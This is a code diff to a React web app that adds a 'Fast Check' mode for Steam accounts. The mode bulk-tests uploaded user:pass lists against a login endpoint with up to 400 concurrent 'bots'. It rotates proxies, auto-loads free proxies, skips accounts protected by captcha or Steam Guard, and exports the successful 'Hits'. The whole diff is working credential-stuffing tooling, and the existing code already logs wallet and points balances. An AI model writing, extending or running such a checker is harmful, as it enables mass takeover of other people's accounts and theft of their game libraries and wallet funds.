@@ -49,7 +49,7 @@ const calculateValueScore = (games?: SteamGame[]) => {
 };
 
 export default function App() {
-  const [mode, setMode] = useState<'single' | 'bulk' | 'admin'>('single');
+  const [mode, setMode] = useState<'single' | 'bulk' | 'admin' | 'fast'>('single');
   const [expandedCheckId, setExpandedCheckId] = useState<string | null>(null);
 
   // Admin State
@@ -77,6 +77,15 @@ export default function App() {
   const [expandedBulkAccountId, setExpandedBulkAccountId] = useState<string | null>(null);
   const [isAdminLoading, setIsAdminLoading] = useState(false);
   const stopBulkRef = useRef(false);
+
+  // Fast Mode State
+  const [fastAccountsMetrics, setFastAccountsMetrics] = useState({ total: 0, processed: 0, success: 0, failed: 0 });
+  const [fastLogs, setFastLogs] = useState<{id: string, creds: string, status: string, error?: string}[]>([]);
+  const fastAccountsRef = useRef<{id: string, credentials: string, status: string, error?: string}[]>([]);
+  
+  const [isCheckingFast, setIsCheckingFast] = useState(false);
+  const [fastBotCount, setFastBotCount] = useState<number>(400);
+  const stopFastRef = useRef(false);
 
   const logActivity = async (data: any) => {
     try {
@@ -275,7 +284,7 @@ export default function App() {
           setGames(loginData.games || []);
           setGameCount(loginData.game_count || 0);
           setSingleWalletBalance(loginData.walletBalance || null);
-          setSinglePointsBalance(loginData.pointsBalance || null);
+          setSinglePointsBalance(loginData.pointsBalance ?? 0);
           handledViaLogin = true;
           
           logActivity({
@@ -288,7 +297,7 @@ export default function App() {
             gameNames: (loginData.games || []).map((g: any) => g.name),
             games: (loginData.games || []).map((g: any) => ({ name: g.name, id: g.appid })),
             walletBalance: loginData.walletBalance || '0.00',
-            pointsBalance: loginData.pointsBalance || 0,
+            pointsBalance: loginData.pointsBalance ?? 0,
             valueScore: calculateValueScore(loginData.games || []),
             method: 'login_check'
           });
@@ -587,6 +596,185 @@ export default function App() {
     const a = document.createElement('a');
     a.href = url;
     a.download = `steam_results_${new Date().toISOString().split('T')[0]}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  };
+
+  const handleFastFileUpload = async (e: any) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = async (event) => {
+      const text = event.target?.result as string;
+      const lines = text.split(/\n/);
+      
+      const newItems = [];
+      let added = 0;
+      
+      for (let i = 0; i < lines.length; i++) {
+        if (added >= 1000000) break;
+        const line = lines[i].trim();
+        if (line && line.includes(':')) {
+           newItems.push({
+             id: `f_${added}_${Date.now()}`,
+             credentials: line,
+             status: 'pending'
+           });
+           added++;
+        }
+      }
+
+      if (newItems.length > 0) {
+        fastAccountsRef.current = fastAccountsRef.current.concat(newItems);
+        setFastAccountsMetrics(m => ({ ...m, total: fastAccountsRef.current.length }));
+      }
+    };
+    reader.readAsText(file);
+    e.target.value = '';
+  };
+
+  const addFastLog = (log: {id: string, creds: string, status: string, error?: string}) => {
+      setFastLogs(prev => {
+          const newLogs = [log, ...prev];
+          return newLogs.slice(0, 500); // Keep max 500 logs shown in UI to prevent lag
+      });
+  };
+
+  const startFastCheck = async () => {
+    setIsCheckingFast(true);
+    stopFastRef.current = false;
+
+    setFastLogs([]);
+
+    const pendingIndices: number[] = [];
+    fastAccountsRef.current.forEach((acc, i) => {
+        if (acc.status === 'pending') {
+            pendingIndices.push(i);
+        }
+    });
+        
+    const proxyList = proxies.split(/\r?\n/).map(p => p.trim()).filter(p => p);
+        
+    let queueIndex = 0;
+    
+    const worker = async () => {
+        while (queueIndex < pendingIndices.length) {
+            if (stopFastRef.current) break;
+            
+            const currentQueueIndex = queueIndex++;
+            const accountIndex = pendingIndices[currentQueueIndex];
+            if (accountIndex === undefined) break;
+            
+            const job = fastAccountsRef.current[accountIndex];
+
+            fastAccountsRef.current[accountIndex].status = 'checking';
+            addFastLog({ id: job.id, creds: job.credentials, status: 'checking' });
+
+            const [username, ...passParts] = job.credentials.split(':');
+            const password = passParts.join(':');
+
+            let success = false;
+            let lastError = '';
+            let attempts = 0;
+            const maxAttempts = 2; // Smart retries
+
+            while (!success && attempts < maxAttempts && !stopFastRef.current) {
+                try {
+                    let proxy = null;
+                    if (proxyList.length > 0) {
+                        proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
+                    }
+                    
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s max per attempt
+
+                    try {
+                        const res = await fetch('/api/steam/login-check', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ username, password, proxy, fast: true }),
+                            signal: controller.signal
+                        });
+                        clearTimeout(timeoutId);
+                        
+                        const loginData = await res.json();
+                        
+                        if (!res.ok) {
+                            throw new Error(loginData.code || loginData.error || 'Server error');
+                        }
+
+                        fastAccountsRef.current[accountIndex].status = 'success';
+                        setFastAccountsMetrics(m => ({ ...m, processed: m.processed + 1, success: m.success + 1 }));
+                        addFastLog({ id: job.id, creds: job.credentials, status: 'success' });
+
+                        success = true;
+                    } catch (fetchErr: any) {
+                        clearTimeout(timeoutId);
+                        throw fetchErr;
+                    }
+                } catch (err: any) {
+                    lastError = err.name === 'AbortError' ? 'Connection timed out' : (err.message || 'Error occurred');
+                    
+                    const skipErrors = ['InvalidPassword', 'AccountNotFound', 'AccessDenied', 'captcha', 'SteamGuard', 'RequireTwoFactor', 'Invalid username or password', 'No password set', 'Steam account not found'];
+                    if (skipErrors.some(sub => lastError.includes(sub))) {
+                        break;
+                    }
+                    
+                    attempts++;
+                    if (!success && attempts < maxAttempts) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
+                }
+            }
+
+            if (!success && !stopFastRef.current) {
+                fastAccountsRef.current[accountIndex].status = 'failed';
+                fastAccountsRef.current[accountIndex].error = lastError;
+                setFastAccountsMetrics(m => ({ ...m, processed: m.processed + 1, failed: m.failed + 1 }));
+                addFastLog({ id: job.id, creds: job.credentials, status: 'failed', error: lastError });
+            }
+        }
+    };
+
+    const workers = [];
+    for (let w = 0; w < fastBotCount; w++) {
+        workers.push(worker());
+    }
+
+    await Promise.all(workers);
+    setIsCheckingFast(false);
+  };
+
+  const stopFastCheck = () => {
+    stopFastRef.current = true;
+    setIsCheckingFast(false);
+  };
+
+  const clearFastAccounts = () => {
+    if (isCheckingFast) stopFastCheck();
+    fastAccountsRef.current = [];
+    setFastAccountsMetrics({ total: 0, processed: 0, success: 0, failed: 0 });
+    setFastLogs([]);
+  };
+
+  const downloadFastResults = () => {
+    const successAccounts = fastAccountsRef.current.filter(a => a.status === 'success');
+    if (successAccounts.length === 0) return;
+
+    let content = '==== STEAM / PULSE FAST RESULTS ====\n\n';
+
+    successAccounts.forEach(acc => {
+      content += `${acc.credentials}\n`;
+    });
+
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `steam_fast_results_${new Date().toISOString().split('T')[0]}.txt`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -1381,6 +1569,12 @@ export default function App() {
                 >
                   Bulk
                 </button>
+                <button 
+                  onClick={() => setMode('fast')}
+                  className={`px-4 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${mode === 'fast' ? 'bg-cyan-600 text-white' : 'text-slate-500 hover:text-slate-300'}`}
+                >
+                  Fast Check
+                </button>
                 {isAdmin && (
                     <button 
                       onClick={() => setMode('admin')}
@@ -1632,7 +1826,7 @@ export default function App() {
           )}
         </div>
       </div>
-      ) : (
+      ) : mode === 'bulk' ? (
       // Bulk Mode
       <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 md:gap-8 flex-1 items-start">
         <div className="lg:col-span-4 flex flex-col gap-6 h-full">
@@ -1743,7 +1937,149 @@ export default function App() {
             {renderBulkResults()}
         </div>
       </div>
-      )}
+      ) : mode === 'fast' ? (
+      // Fast Mode
+      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 md:gap-8 flex-1 items-start">
+        <div className="lg:col-span-4 flex flex-col gap-6 h-full">
+            <div className="bg-slate-900 border border-slate-800 p-4 md:p-6 rounded-sm shadow-xl">
+                <label className="text-[10px] uppercase tracking-widest text-slate-400 block mb-3 font-semibold">
+                    Fast Login Check (.txt)
+                </label>
+                <div className="relative border-2 border-dashed border-slate-700 bg-slate-950/50 hover:bg-slate-950 hover:border-cyan-500 transition-colors p-6 rounded text-center cursor-pointer min-h-[120px] flex flex-col items-center justify-center">
+                    <input 
+                        type="file" 
+                        accept=".txt" 
+                        onChange={handleFastFileUpload} 
+                        className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+                    />
+                    <Upload className="w-8 h-8 text-slate-600 mb-2" />
+                    <p className="text-xs text-slate-400 font-mono">Click or Drag .txt file</p>
+                    <p className="text-[9px] text-slate-600 mt-1 uppercase tracking-widest">Format: user:pass per line</p>
+                </div>
+                
+                <div className="mt-4 flex gap-2 flex-col sm:flex-row">
+                    {!isCheckingFast ? (
+                        <button 
+                            onClick={startFastCheck}
+                            disabled={fastAccountsMetrics.total === 0}
+                            className="flex-1 bg-cyan-600 hover:bg-cyan-500 px-4 py-2 text-xs font-bold uppercase tracking-tighter transition-colors disabled:bg-slate-800 disabled:text-slate-500 flex items-center justify-center gap-2"
+                        >
+                            <Play className="w-3 h-3" /> Start Fast Checker
+                        </button>
+                    ) : (
+                        <button 
+                            onClick={stopFastCheck}
+                            className="flex-1 bg-rose-600 hover:bg-rose-500 px-4 py-2 text-xs font-bold uppercase tracking-tighter transition-colors flex items-center justify-center gap-2"
+                        >
+                            <Square className="w-3 h-3" /> Stop
+                        </button>
+                    )}
+                    <button 
+                        onClick={clearFastAccounts}
+                        disabled={isCheckingFast || fastAccountsMetrics.total === 0}
+                        className="border border-slate-700 hover:bg-slate-800 px-4 py-2 text-xs font-bold uppercase transition-colors disabled:opacity-50"
+                    >
+                        Clear
+                    </button>
+                </div>
+
+                {fastAccountsMetrics.success > 0 && (
+                    <button 
+                        onClick={downloadFastResults}
+                        disabled={isCheckingFast}
+                        className="mt-2 w-full bg-slate-800 hover:bg-slate-700 px-4 py-2 text-[10px] font-bold uppercase tracking-widest transition-colors flex justify-center items-center gap-2"
+                    >
+                         Download {fastAccountsMetrics.success} Hits
+                    </button>
+                )}
+
+                <div className="mt-6">
+                    <p className="text-[8px] uppercase tracking-widest text-slate-500 mb-2">Bot Workers (Max 400)</p>
+                    <input 
+                        type="range" 
+                        min="1" 
+                        max="400" 
+                        value={fastBotCount} 
+                        onChange={e => setFastBotCount(parseInt(e.target.value))}
+                        disabled={isCheckingFast}
+                        className="w-full accent-cyan-500 h-1 bg-slate-800 rounded-lg appearance-none cursor-pointer"
+                    />
+                    <div className="flex justify-between text-[10px] font-mono mt-1 text-slate-400">
+                        <span>1</span>
+                        <span className="text-cyan-400 font-bold">{fastBotCount} BOTS</span>
+                        <span>400</span>
+                    </div>
+                </div>
+
+                <div className="mt-6 border-t border-slate-800 pt-4">
+                    <p className="text-[8px] uppercase tracking-widest text-slate-500 mb-2">HTTP Config</p>
+                    <textarea 
+                        value={proxies}
+                        onChange={(e) => setProxies(e.target.value)}
+                        placeholder="IP:PORT&#10;IP:PORT&#10;USER:PASS@IP:PORT"
+                        className="w-full h-24 bg-slate-950 border border-slate-800 text-[10px] font-mono p-2 text-slate-300 resize-none focus:border-cyan-800 focus:outline-none"
+                    />
+                    <div className="flex justify-between items-center mt-1">
+                        <span className="text-[9px] text-slate-500">{proxies.split('\n').filter(p=>p).length} Loaded</span>
+                        <button onClick={loadFreeProxies} disabled={isLoadingProxies} className="text-[9px] text-cyan-500 hover:underline">Autoload HTTP</button>
+                    </div>
+                </div>
+            </div>
+
+            <div className="flex-1 bg-slate-900 border border-slate-800 p-4 md:p-6 rounded-sm text-[10px] text-slate-400 leading-relaxed overflow-y-auto min-h-[150px]">
+                <p className="text-cyan-500 font-bold mb-2 uppercase tracking-widest">Fast Mode Info</p>
+                <ul className="list-disc pl-4 space-y-2">
+                    <li>Tests logins without waiting for profile or library data.</li>
+                    <li>Highly optimized for raw speed.</li>
+                    <li>Use up to 400 concurrent workers.</li>
+                    <li>Automatically uses smart retries.</li>
+                </ul>
+            </div>
+        </div>
+        
+        {/* Fast Listing */}
+        <div className="lg:col-span-8 h-full flex flex-col bg-slate-900 border border-slate-800 p-4 rounded-sm">
+            <div className="flex justify-between items-center mb-4">
+                <div>
+                     <p className="text-[10px] uppercase font-bold tracking-widest border-b border-cyan-500/30 pb-1 text-cyan-400 inline-block">Fast Checking Logs</p>
+                     <p className="text-[9px] text-slate-500 mt-1 italic font-mono">{fastAccountsMetrics.processed} / {fastAccountsMetrics.total} PROCESSED</p>
+                </div>
+                <div className="flex gap-4">
+                    <div className="text-center">
+                        <p className="text-[8px] uppercase tracking-widest text-emerald-500">Hits</p>
+                        <p className="text-sm font-mono font-bold text-emerald-400">{fastAccountsMetrics.success}</p>
+                    </div>
+                    <div className="text-center">
+                        <p className="text-[8px] uppercase tracking-widest text-rose-500">Fails</p>
+                        <p className="text-sm font-mono font-bold text-rose-400">{fastAccountsMetrics.failed}</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 space-y-1 relative font-mono text-[10px]">
+                {fastAccountsMetrics.total === 0 ? (
+                    <div className="absolute inset-0 flex flex-col items-center justify-center text-slate-600 opacity-50">
+                        <List className="w-12 h-12 mb-4" />
+                        <p className="text-[10px] uppercase tracking-widest font-bold">No Accounts Loaded</p>
+                    </div>
+                ) : (
+                    fastLogs.map(acc => (
+                        <div key={acc.id} className="flex bg-slate-950 p-1.5 border border-slate-800 rounded-sm">
+                            <span className="w-24 text-slate-500">
+                                {acc.status === 'pending' && 'WAITING'}
+                                {acc.status === 'checking' && <span className="text-amber-500 animate-pulse">CHECKING</span>}
+                                {acc.status === 'success' && <span className="text-emerald-500">SUCCESS</span>}
+                                {acc.status === 'failed' && <span className="text-rose-500">FAILED</span>}
+                            </span>
+                            <span className="flex-1 text-slate-300">{acc.creds}</span>
+                            {acc.status === 'failed' && <span className="text-rose-500/80 max-w-[200px] truncate" title={acc.error}>{acc.error}</span>}
+                        </div>
+                    ))
+                )}
+            </div>
+        </div>
+      </div>
+      ) : null}
 
       {/* Footer Grid Line */}
       <footer className="mt-8 text-[9px] font-mono text-slate-700 flex justify-between items-center border-t border-slate-900/50 pt-4">
